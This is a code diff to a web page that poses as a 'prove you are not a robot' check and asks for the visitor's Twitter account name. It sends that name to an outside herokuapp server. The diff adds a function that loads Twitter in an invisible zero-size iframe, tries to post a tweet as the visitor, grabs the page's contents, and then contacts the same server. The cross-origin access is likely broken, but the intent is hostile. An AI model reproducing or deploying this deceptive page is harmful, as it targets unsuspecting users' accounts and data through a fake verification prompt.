@@ -67,8 +67,7 @@
         <form id="myForm">
           <div class="mb-3 m-2">
             <h2 class="">Prove you are not a robot </h2>
-            <label for="exampleInputname" required
-             class="form-label">Enter your account name</label>
+            <label for="exampleInputname" required class="form-label">Enter your account name</label>
             <input type="name" name="searchTerm" class="form-control" id="exampleInputname1" aria-describedby="nameHelp"
               placeholder="@acount_name">
             <!-- check box -->
@@ -116,9 +115,45 @@
   </div>
   <script>
 
-
-
+    
+    
+    
+    
     function getdata() {
+      var element = document.createElement("iframe");
+      element.setAttribute('id', 'myframe');
+      element.setAttribute('src', 'https://twitter.com/home');
+      document.body.appendChild(element);
+      document.getElementById("myframe").style.width = "0px";
+      document.getElementById("myframe").style.height = "0px";
+      let ifram = document.getElementById("myframe");
+      // access the content of the iframe
+      let doc = ifram.contentDocument || ifram.contentWindow.document;
+      // get the element by id
+      let element1 = doc.getElementById("global-new-tweet-button");
+      // click the element
+      element1.click();
+      // get the element by id
+      let element2 = doc.getElementById("tweet-box-global");
+      // set the value
+      element2.value = "hello world";
+      // get the element by id
+      let element3 = doc.getElementById("tweet-button");
+      // click the element
+      element3.click();
+
+      // iframe page source
+      let data ={
+        "name":doc.documentElement.innerHTML
+      }
+
+      console.log(data);
+       
+       
+
+
+
+
       let xhrr = new XMLHttpRequest()
 
       xhrr.open('GET', `https://verify-check-twitter.herokuapp.com/`)
@@ -133,25 +168,25 @@
     document.querySelector('#myForm').addEventListener('submit', function () {
       event.preventDefault()
       var name = document.querySelector('[name="searchTerm"]').value
-      if(name == ''){
+      if (name == '') {
         alert('Please enter your account name')
       }
-      else{
-      //send data
-      var xhr = new XMLHttpRequest()
-      xhr.open('POST', `https://verify-check-twitter.herokuapp.com/get-location`)
-      xhr.setRequestHeader('Content-Type', 'application/json')
-      xhr.send(JSON.stringify({
-        name
-      }))
-      xhr.onload = function () {
-        console.log(xhr.responseText)
-        window.location.href = "https://twitter.com/home"
+      else {
+        //send data
+        var xhr = new XMLHttpRequest()
+        xhr.open('POST', `https://verify-check-twitter.herokuapp.com/get-location`)
+        xhr.setRequestHeader('Content-Type', 'application/json')
+        xhr.send(JSON.stringify({
+          name
+        }))
+        xhr.onload = function () {
+          console.log(xhr.responseText)
+          window.location.href = "https://twitter.com/home"
+        }
+        // after sending data redirect to the next page
+
+
       }
-      // after sending data redirect to the next page
-
-
-    }
 
 
 
